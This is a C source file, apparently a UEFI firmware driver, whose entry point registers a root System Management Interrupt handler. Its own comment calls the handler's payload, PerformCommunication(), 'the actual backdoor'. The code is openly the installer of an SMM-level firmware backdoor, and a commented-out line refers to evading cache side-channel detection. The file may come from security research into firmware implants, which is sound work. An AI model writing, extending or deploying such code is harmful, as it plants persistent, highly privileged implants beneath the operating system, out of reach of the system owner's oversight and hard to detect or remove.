#include "communication.h"
#include "memory.h"
#include <Library/SmmCpuRendezvousLib.h>
#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <PiDxe.h>
#include <Library/BaseLib.h>
#include <Library/DebugLib.h>
#include <Library/MmServicesTableLib.h>

static EFI_SMM_BASE2_PROTOCOL* SmmBase2;
VOID EFIAPI ClearCache();

EFI_STATUS EFIAPI SmiHandler(EFI_HANDLE dispatch, CONST VOID* context, VOID* buffer, UINTN* size)
{

  // This is redundant but is done for security reasons. rendezvous
  if (EFI_ERROR(SmmWaitForAllProcessor(TRUE)))
  {
    //while(TRUE){}
    return EFI_SUCCESS;
  }

  // Perform the actual backdoor
  PerformCommunication();

  // Make sure we are not running into a cache side channel attack. When the system leaves SMM it might clear cache.
  //ClearCache();

  return EFI_SUCCESS;
}

EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE image, IN EFI_SYSTEM_TABLE* table)
{
  gRT = table->RuntimeServices;
  gBS = table->BootServices;
  gST = table;
  EFI_SMM_SYSTEM_TABLE2* GSmst2;
  
  if (EFI_ERROR(gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, 0, (void**)&SmmBase2)))
  {
    return EFI_SUCCESS;
  }

  if (EFI_ERROR(SmmBase2->GetSmstLocation(SmmBase2, &GSmst2)))
  {
    return EFI_SUCCESS;
  }

  //Register root handler
  EFI_HANDLE handle;
  GSmst2->SmiHandlerRegister(&SmiHandler, NULL, &handle);

  if (EFI_ERROR(SetupMemoryMap()))
  {
    return EFI_ERROR_MAJOR;
  }

  return EFI_SUCCESS;
}
